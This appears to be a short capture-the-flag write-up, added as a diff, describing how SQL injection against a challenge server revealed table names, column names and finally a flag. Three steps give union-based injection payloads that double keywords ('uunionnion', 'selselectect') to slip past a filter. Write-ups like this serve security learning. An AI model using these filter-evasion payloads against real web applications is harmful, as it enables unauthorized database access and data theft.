@@ -1,0 +1,5 @@
+1. From the problem it is understood that the tables in the server are needed to analyze to get the flag.
+2. I found all the tables using the sql command: ' uunionnion selselectect null,table_name,null,null,null,null,null,null,null,null,null,null,null,null from infoorrmation_schema.columns#
+3. Executing the above sql command gave me 3 user created table i.e conn , student and ft8835345.
+4. Then I found all the column names of the tables using the sql command: ' uunionnion selselectect null,column_name,null,null,null,null,null,null,null,null,null,null,null,null from infoorrmation_schema.columns#
+5. Then printing the values of each of this column name at different tables I found the flag at name column of ft8835345 table using the sql command: ' uunionnion selselectect null,name,null,null,null,null,null,null,null,null,null,null,null,null from ft8835345# 
